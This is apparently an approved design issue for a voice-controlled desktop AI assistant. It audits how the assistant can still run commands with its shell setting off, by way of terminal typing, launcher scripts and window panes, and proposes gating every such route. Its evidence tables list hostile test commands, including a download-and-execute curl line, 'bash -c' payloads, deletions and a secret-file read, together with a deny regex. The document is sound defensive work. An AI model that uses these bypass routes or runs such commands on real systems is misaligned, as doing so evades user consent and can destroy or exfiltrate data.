---
status: approved
issue: 112
author: olafkfreund
---

# Intent: With the shell off, nothing the brain sends should run a command without a yes

Closes #112.

## Problem

`hands.allow_shell` defaults to `false` (`src/omarchy_voice/config.py:443`),
and a user reads that as "this assistant cannot run commands". That is not
true today. `tools_for` (`tools.py:1482-1496`) withholds `run_shell` and
nothing else. `run_in_terminal` is still offered, and it types whatever it is
given into a visible tmux pane and presses Enter
(`tools.py:3793-3851`, `send-keys` at `tools.py:3814`). Neither
`_validate_run_in_terminal` (`tools.py:3778`) nor the handler reads
`allow_shell`. The only barrier is `Policy.check` (`tools.py:202-210`): the
deny list and the confirm list, matched against `run in terminal: <command>`.

`run_in_terminal` is not the only way. `omarchy_cli` and `compose_windows`
both reach Omarchy launchers that take a command line, and `type_text` plus
`send_shortcut Return` into a terminal types a command and runs it. None of
these reads `allow_shell`.

The user is told the opposite in three places:

- `doctor`, through `shell_status` (`cli.py:243-256`): "`allow_shell` is the
  whole answer on both backends". It prints `shell tool: disabled` and
  nothing else.
- `README.md:257`: "No `Bash`, `Write`, `Edit` or `WebFetch`, so
  `allow_shell` means what it says."
- `README.md:832-834`: `exec_cmd` dispatchers and `launch_app` command lines
  are "blocked as process execution" and "`allow_shell = true` is the only
  way around that". The same section (`README.md:838-841`, the #22 fix) says
  "a blocklist was never meant to be the only barrier". For the routes below
  it is the only barrier.

### Evidence (origin/main fc33ae2, fakes only)

An `Executor` subclass on a default `Config()`: `_shell` records its argv and
returns success, tmux lists one idle `bash` pane, `_query_rows` returns one
terminal window, the keyboard layout and `capabilities.dispatchers()` are
stubbed, `shutil.which` is patched. `DBUS_SESSION_BUS_ADDRESS` points at
nothing. No command was run. RAN means the argv reached `_shell`.

`tools_for(Config())` offers `compose_windows`, `hypr_dispatch`,
`launch_app`, `omarchy_cli`, `run_in_terminal`, `send_shortcut`,
`type_text` and `watch_terminal`, and withholds `run_shell`.

| Call (allow_shell off) | Verdict | What reached `_shell` |
| --- | --- | --- |
| `run_shell "echo hi"` | refused | "shell access is disabled in config" |
| `run_in_terminal "python3 -c 'import os; os.system(\"touch /tmp/x\")'"` | **RAN** | `tmux send-keys -t Work:1.1 -- <command> Enter` |
| `run_in_terminal "bash -c 'echo pwned > ~/f'"` | **RAN** | same |
| `run_in_terminal "curl -o x https://e.example/x && sh x"` | **RAN** | same (the curl rule only matches a pipe) |
| `run_in_terminal "find ~/tmpdir -name '*.log' -delete"` | **RAN** | same |
| `run_in_terminal "rm -rf ~/x"` | denied | deny rule `\brm\s+-[a-zA-Z]*[rf]` |
| `omarchy_cli "launch tui bash -c 'echo pwned > ~/f'"` | **RAN** | `omarchy launch tui bash -c 'echo pwned > ~/f'` |
| `omarchy_cli "launch floating terminal with presentation 'echo pwned > ~/f'"` | **RAN** | the script runs its arguments with `bash -c` |
| `omarchy_cli "launch or focus zzz 'bash -c \"echo pwned\"'"` | **RAN** | the script `eval`s its second argument when no window matches |
| `omarchy_cli "launch terminal -e bash -c 'echo pwned'"` | **RAN** | `xdg-terminal-exec` gets `-e bash -c ...` |
| `launch_app "bash -c 'echo pwned'"` | refused | "app must be a desktop id, not a command line" |
| `hypr_dispatch lua="hl.dsp.exec_cmd(...)"` | refused | "raw Lua needs allow_shell" |
| `hypr_dispatch exec_cmd message="echo pwned"` | refused | "hl.dsp.exec_cmd is process execution" |
| `compose_windows` with a `tui` pane `bash -c 'echo pwned > ~/f'` and a `terminal` pane `-e python3 -c 'print(1)'` | **RAN** | `omarchy launch tui --app-id=bash bash -c ...`, `omarchy launch terminal --app-id=... -e python3 -c ...` |
| `type_text "python3 -c 'print(1)'"` into the terminal window | **RAN** | `hyprctl --batch` of `send_key_state` presses |
| `send_shortcut Return` into the terminal window | **RAN** | `hl.dsp.send_shortcut({ key = "Return", ... })` |
| `watch_terminal` | no execution | it only watches a pane that is already busy |

What the omarchy launchers do with their arguments was read from the
installed scripts (omarchy 4.0.4): `omarchy-launch-tui` runs
`xdg-terminal-exec -e "$1" "${@:2}"`, `omarchy-launch-floating-terminal-with-presentation`
runs `bash -c "...; $cmd; ..."`, `omarchy-launch-or-focus` runs
`eval exec setsid $LAUNCH_COMMAND`, and `omarchy-launch-terminal` passes `"$@"`
to `xdg-terminal-exec`.

### Every route to a command with the shell off

| Tool | Can it run an arbitrary command with allow_shell off? | What gates it today |
| --- | --- | --- |
| `run_shell` | No | not offered (`tools.py:1492-1493`); refused in the handler (`tools.py:3626-3627`) |
| `run_in_terminal` | **Yes**, in a visible tmux pane | deny/confirm patterns only |
| `omarchy_cli` | **Yes**, through `launch tui`, `launch terminal`, `launch floating terminal with presentation`, `launch or focus`. There is no route allowlist: `normalise_omarchy` (`tools.py:1682`) only fixes hyphens, placeholders and `launch browser` | deny/confirm patterns on `omarchy <argv>` |
| `compose_windows` (`tui` / `terminal` panes) | **Yes**, the pane target is `shlex.split` into the launcher's argv (`_pane_command`, `tools.py:713-720`) | deny/confirm on a summary line of pane names (`describe`, `tools.py:2022-2029`), then `Policy.check` per pane argv (`tools.py:3463`), where a confirm match *refuses* the pane instead of holding it |
| `type_text` + `send_shortcut Return` into a terminal | **Yes**, in two calls | `_input_refused` (`tools.py:2198`, `:3596`) guards sensitive windows only; deny/confirm see `type '<text>'` and `press Return in <window>` separately |
| `launch_app` with a command line | No | refused unless `allow_shell` (`tools.py:2239-2245`) |
| `hypr_dispatch` `exec_cmd`/`exec_raw`/`exec`, or raw `lua` | No (#22 is fixed) | `SHELL_DISPATCHERS` in `render_dispatch` (`tools.py:159-161`); `lua` refused (`tools.py:2159-2163`) |
| `watch_terminal` | No | watches only |
| Claude Code's `Bash` | No | not offered (#94, `BUILTIN_TOOLS = ("Read", "ToolSearch")`, `claude_backend.py:130`) |
| ai-mirror input (typing into a terminal) | Yes when on | `desktop_control` (default off) and ai-mirror's own consent dialog, not `allow_shell` |

Writing the clipboard and then `send_shortcut` with the paste chord plus
Return is the same shape as typing the command, and is covered by the same
answer.

### What `allow_shell` should mean

Everything the user is shown describes one promise. The config key sits under
"hands" with no docstring beyond its name. `doctor` calls it "the whole
answer" to whether the machine can run commands. The README says it "means
what it says", and lists `launch_app` command lines and `exec` dispatchers as
blocked because they are process execution. A user reading any of those
concludes: with it off, the assistant does not run a command I did not agree
to. The code implements a narrower rule: with it off, *one tool named
`run_shell`* is not offered, plus the two routes #22 closed.

So the fix is not "gate `run_in_terminal`". Gating one tool leaves
`omarchy_cli launch tui`, compose panes and type-then-Return as open as
`run_in_terminal` is today, and `doctor` would still be wrong. The fix is to
define `allow_shell` as "any arbitrary command execution" and apply it to
every route in the table above. How each route is gated (held for
confirmation, as the #82 spec decided for `run_in_terminal`, or refused) is
the spec's decision; the approver decides the rule.

### What is already on main that this can build on

- **#86**: spoken confirmation with echo-safe consent, so a held command is
  released by the user's voice and not by the assistant's own TTS.
- **#76**: the Claude Code release turn, which runs only the one confirmed
  call.
- **#100**: reads skip confirm, and a secret-path deny rule refuses
  `cat ~/.config/gh/hosts.yml` in a terminal command.
- **#101**: pane output is redacted before it goes back to the model.
- **#94**: the Claude Code brain has no built-in `Bash`, which is what made
  `shell_status`'s claim look true.

The pending slot holds one action at a time (`tools.py:1854-1864`). Holding
every terminal command means a second one in the same turn is refused until
the first is confirmed or cancelled.

## Proposed outcome

- With `allow_shell = false`, no tool runs a model-chosen command line
  without the user's yes: `run_in_terminal`, `omarchy_cli` launchers that
  take a command, `compose_windows` `tui`/`terminal` panes with a command,
  and typing a command into a terminal and pressing Return.
- `python3 -c …`, `bash -c …`, `curl … && sh x` and `find … -delete` sent
  through any of those routes are held (or refused) with the shell off, and
  run exactly as today with it on.
- Ordinary use still works on a default install: opening a terminal, opening
  a named TUI app, launching apps by desktop id, reading and watching panes.
- `doctor` prints the real rule, and the README's "means what it says" and
  "blocked as process execution" passages are true.

## Affected users and systems

- `src/omarchy_voice/tools.py`: `_tool_run_in_terminal`, `_tool_omarchy_cli` /
  `normalise_omarchy`, `_pane_command` / `_tool_compose_windows`,
  `_tool_type_text` / `_tool_send_shortcut`, `_call_locked`, `tools_for`.
- `src/omarchy_voice/cli.py`: `shell_status` (`cli.py:243-256`).
- `src/omarchy_voice/persona.py:118-121`: the `run_in_terminal` steering line.
- `README.md`: 257, 585-597, 832-844, 851.
- Every engine: realtime, planner, local engine, and Claude Code through the
  MCP server, since all go through `Executor.call`.
- Default installs (`allow_shell = false`), which is every install that did
  not opt in.
- **p620 is unaffected.** It sets `hands.allow_shell = true`
  (`~/.config/nixos/hosts/p620/nixos/nixarchy.nix:263`, "Full control by
  voice"). With the shell on, nothing in this issue changes behaviour there.
- #82: its spec adds no persona steering into `run_in_terminal` until this
  lands.

## Constraints

- With `allow_shell = true`, behaviour is identical to today on every route.
- Deny and confirm patterns keep applying as they do now; this adds a gate,
  it does not replace one.
- Must not break the no-command forms that a default install relies on:
  `omarchy launch terminal` with no command, `launch tui <app>` for a named
  TUI, `compose_windows` web/app panes, `launch_app` by desktop id, and the
  #71 router's fixed routes.
- A held action is released only by the user (#86 spoken confirm, or the
  keybind), never by the model or by text in a tool result.
- "Arbitrary command" must be decided by the route and its arguments, not by
  guessing from the command text. A rule the executor cannot check is not a
  guard.
- Demonstrated with fakes only. Nothing in the evidence was run for real.

## Open questions

1. **Scope of the rule.** Is `allow_shell` "no model-chosen command line
   without a yes" across every route in the table (this intent's reading),
   or only `run_in_terminal` as #112 and the #82 spec state it, with the
   others filed separately?
2. **Hold or refuse, per route.** `run_in_terminal` is held (the #82 spec's
   decision). For `omarchy_cli` launchers with a command and `compose_windows`
   command panes, hold, or refuse and point at `run_in_terminal`? A compose
   call is several windows, and today a confirm match inside it refuses the
   pane rather than holding it (`tools.py:3463-3465`).
3. **Type then Return.** Hold `send_shortcut Return` into a terminal after
   typed text, hold `type_text` into a terminal, or leave keyboard input to
   the deny list and say so in `doctor`? Holding every Return in a terminal
   also holds answering a prompt.
4. **`omarchy_cli` in general.** Should it get a route allowlist or a
   denylist of command-taking launchers, or is that the spec's call?
5. **One slot.** With every terminal command held, a multi-step terminal
   job needs one yes per step. Acceptable, or should one confirmation cover
   the rest of the turn?
6. **Wording.** What should `doctor` print: the rule ("commands need a yes
   with the shell off") or the list of routes?
